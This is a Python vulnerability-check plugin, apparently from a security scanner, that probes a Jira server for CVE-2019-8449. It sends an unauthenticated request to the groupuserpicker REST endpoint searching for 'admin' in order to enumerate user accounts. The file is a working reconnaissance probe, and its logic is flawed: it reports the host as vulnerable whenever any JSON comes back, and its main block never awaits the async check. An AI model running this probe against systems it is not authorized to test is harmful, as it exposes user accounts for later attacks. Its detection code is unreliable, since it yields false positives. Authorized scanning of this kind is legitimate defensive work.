#!/usr/bin/python3

from app.lib.common import get_useragent
from app.lib.request import request

class CVE_2019_8449_BaseVerify:
    def __init__(self, url):
        self.info = {
            'name': 'CVE-2019-8449漏洞',
            'description': 'CVE-2019-8449漏洞,影响范围为: Jira v2.1 - v8.3.4',
            'date': '2019-02-18',
            'exptype': 'check',
            'type': 'Username Enum'
        }
        self.url = url
        self.headers = {
            'User-Agent': get_useragent()
        }
        self.query = 'admin' # search keyword
        self.maxResults = '50' # the number of maximum results to fetch: (50) => ")
        self.showAvatar = 'true' # 'true' or 'false' whether to show Avatar of the user or not
        self.fieldId = '' # the fieldId to fetch
        self.projectId ='' # the projectId to fetch
        self.issueTypeId = '' # Enter the issueTypeId to fetch
        self.avatarSize = '' # the size of Avatar to fetch: (xsmall)
        self.caseInsensitive = 'true' # 'true' or 'false' whether to show results case insensitive or not
        self.excludeConnectAddons = '' #Indicates whether Connect app users and groups should be excluded from the search results. If an invalid value is provided, the default value is used:

        self.params = {
            'query': self.query, 
            'maxResults': self.maxResults, 
            'showAvatar': self.showAvatar, 
            'fieldId': self.fieldId, 
            'projectId': self.projectId, 
            'issueTypeId': self.issueTypeId, 
            'avatarSize': self.avatarSize, 
            'caseInsensitive': self.caseInsensitive, 
            'excludeConnectAddons': self.excludeConnectAddons
        }

    async def check(self):
        
        """
        检测是否存在漏洞

        :param:

        :return bool True or False: 是否存在漏洞
        """
        
        if not self.url.startswith("http") and not self.url.startswith("https"):
            self.url = "http://" + self.url
        check_url = self.url + '/rest/api/latest/groupuserpicker'
        try:
            check_quest = await request.get(url = check_url, headers = self.headers, params = self.params)
            check_json = await check_quest.json()
            return True
        except Exception as e:
            # print(e)
            pass

if __name__ == '__main__':
    CVE_2019_8449 = CVE_2019_8449_BaseVerify('http://127.0.0.1')
    CVE_2019_8449.check()
